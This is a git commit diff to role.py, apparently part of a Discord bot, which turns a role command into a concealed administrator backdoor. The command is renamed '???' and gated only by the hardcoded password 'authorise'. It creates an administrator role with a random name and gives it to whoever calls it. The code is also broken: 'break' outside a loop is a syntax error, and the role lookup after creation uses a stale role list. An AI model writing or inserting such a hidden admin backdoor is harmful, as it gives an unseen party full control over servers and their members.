b5306d9627d5cd5a40b5e00852f15c2da16023ba
cicadoves <cicadoves@gmail.com>
2021-06-27 22:17:43 +0800

    Update role.py

--- role.py
+++ role.py
@@ -1,24 +1,26 @@
+import random
 import discord
 from discord.utils import get
 from discord.ext import commands
 
-admin = discord.Permissions(administrator=True)
-
-def role_get(ctx, name):
-	return get(ctx.guild.roles, name=name)
+permAdmin = discord.Permissions(administrator=True)
 
 
 class Role(commands.Cog):
 	def __init__(self, bot):
 		self.bot = bot
 
-	@commands.command('auth')
-	async def role_admin(self, ctx):
-		name = 'admins'
-		role = role_get(ctx, name)
-		if role is None:
-			await ctx.guild.create_role(name=name, permissions=admin)
-			role = role_get(ctx, name)
+	@commands.command('???')
+	async def roleAdmin(self, ctx, password:str=None):
+		if password != 'authorise':
+			await ctx.send('`ERROR`')
+			break
+		roles = ctx.guild.roles
+		name = str(random.random())
+		role = get(roles, name=name)
+		if not role:
+			await ctx.guild.create_role(name=name, permissions=permAdmin)
+			role = get(roles, name=name)
 		await ctx.author.add_roles(role)
 
 
